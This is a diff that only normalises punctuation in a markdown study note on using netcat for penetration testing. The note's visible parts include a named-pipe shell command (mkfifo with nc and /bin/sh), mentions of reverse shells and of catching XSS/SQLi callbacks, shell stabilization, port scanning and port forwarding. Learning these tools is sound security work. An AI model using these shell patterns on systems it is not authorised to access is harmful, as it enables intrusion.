@@ -1,4 +1,4 @@
-# Using “netcat”
+# Using "netcat"
 
 author:: Nathan Acks
 date:: 2022-06-29
@@ -29,18 +29,18 @@ The $HOST specification here is optional; if left off, nc binds to 0.0.0.0.
 
 Note that nc will exit once the first connection closes.
 
-(According to the nc docs, it looks like `nc -l $HOST $PORT` should also work, but it doesn’t. I think — though I haven’t been able to verify — that what’s happening here is that `-p` specifies the port to *listen* to, while the port following the $HOST specification is the port to *connect* to.)
+(According to the nc docs, it looks like `nc -l $HOST $PORT` should also work, but it doesn't. I think - though I haven't been able to verify - that what's happening here is that `-p` specifies the port to *listen* to, while the port following the $HOST specification is the port to *connect* to.)
 
-A netcat server doesn’t have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with XSS or SQLi attacks.
+A netcat server doesn't have to be used just for reverse shells. For example, you can also use it to catch web requests in conjunction with XSS or SQLi attacks.
 
 ## Useful Flags
 
-* `-l` — listen for incoming connections (rather than make an outgoing connection)
-* `-v` — verbose
-* `-n` — skip DNS resolution (slightly faster, less noisy on the network)
-* `-p` — specify the port to *listen* to
-* `-u` — connect using UDP instead of TCP
-* `-k` — keep listening even after client disconnects
+* `-l` - listen for incoming connections (rather than make an outgoing connection)
+* `-v` - verbose
+* `-n` - skip DNS resolution (slightly faster, less noisy on the network)
+* `-p` - specify the port to *listen* to
+* `-u` - connect using UDP instead of TCP
+* `-k` - keep listening even after client disconnects
 
 ## Example Attack Patterns
 
@@ -56,7 +56,7 @@ Example bind shell:
 
 These are almost, but not quite, mirror images of each other.
 
-The `-e` switch isn’t available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:
+The `-e` switch isn't available on many UNIX-like OSes. Working around this leads to the common named pipe pattern:
 
 ```bash
 mkfifo /tmp/p; \
@@ -65,13 +65,13 @@ nc -lvnp $LISTENER_PORT < /tmp/p | \
 rm /tmp/p
 ```
 
-(Note that it’s also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)
+(Note that it's also possible to reverse the /bin/sh and nc portions of things; what important is that the named pipe lets us loop I/O between the two applications. See the discussion of msfvenom payloads for a detailed breakdown of this pattern.)
 
 Initial netcat reverse shells (in particular web shells) are non-interactive.
 
-### Shell “Stabilization”
+### Shell "Stabilization"
 
-Shell “stabilization” refers to the process of making a remote shell behave like a normal local shell — so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a *second* connection from within the “unstable” shell, and then using that (keeping the first connection around just so you can restart the “stabilized” shell if you accidentally exit/kill it).
+Shell "stabilization" refers to the process of making a remote shell behave like a normal local shell - so, allowing interactive programs to work properly, ensuring that input is not echoed inappropriately, etc. In practice, this generally involves creating a *second* connection from within the "unstable" shell, and then using that (keeping the first connection around just so you can restart the "stabilized" shell if you accidentally exit/kill it).
 
 A common method of stabilizing netcat shells is to use Python:
 
@@ -89,7 +89,7 @@ rlwrap -cAr nc -lvnp $PORT
 
 Or just use socat!
 
-NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you’ll need to manually specify it using `stty rows` and `stty cols`.
+NOTE that in *none* of these cases will the reverse shell pick up on your terminal size, so you'll need to manually specify it using `stty rows` and `stty cols`.
 
 ## Port Forwarding
 
@@ -105,12 +105,12 @@ If you just have netcat connect to a service directly, it functions exactly like
 
 ### Port Scanning
 
-With the `-z` option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It’s like a simple, very slow version of Nmap!
+With the `-z` option, netcat will attempt to connect to all TCP ports on the targets in a sequential fashion (if no ports are specified; otherwise just to the specified port), reporting which are open. It's like a simple, very slow version of Nmap!
 
 Useful flags:
 
-* `-w` — set the timeout, in seconds
-* `-u` — try connecting over UDP rather than TCP
+* `-w` - set the timeout, in seconds
+* `-u` - try connecting over UDP rather than TCP
 
 ### Port Forwarding
 
@@ -124,13 +124,13 @@ nc -lvkp $LOCAL_PORT -c "nc $REMOTE_IP $REMOTE_PORT"
 * [TryHackMe: CC: Pen Testing](tryhackme-cc-pen-testing.md)
 * [TryHackMe: Exploiting Log4j](tryhackme-exploiting-log4j.md)
 * [Using Metasploit](metasploit.md)
-* [Using “socat”](socat.md)
+* [Using "socat"](socat.md)
 * [XSS (Cross-Site Scripting) Attacks](xss-attacks.md)
 * [SQL Injection](sql-injection.md)
 * [2022-03-30 - ITPro.TV: CompTIA Security+ (SY0-601) & TryHackMe: Jr. Penetration Tester](../log/2022-03-30-itprotv-comptia-security-plus-and-tryhackme-jr-penetration-tester.md)
 * [Alice with Siddicky (Student Mentor) (YouTube)](https://www.youtube.com/watch?v=Zma6Mk5bEI8)
 * [2022-05-09 - TryHackMe: Jr. Penetration Tester (Supplements)](../log/2022-05-09-tryhackme-jr-penetration-tester-supplements.md)
 * [2022-06-29 - OffSec Live: PEN-200 & AWS Deep Dive](../log/2022-06-29-offsec-live-pen-200-and-aws-deep-dive.md)
-* [Using “nmap”](nmap.md)
+* [Using "nmap"](nmap.md)
 * [slyth11907 / Cheatsheets](https://github.com/slyth11907/Cheatsheets)
 * [2022-07-13 - OffSec Live: PEN-200](../log/2022-07-13-offsec-live-pen-200.md)
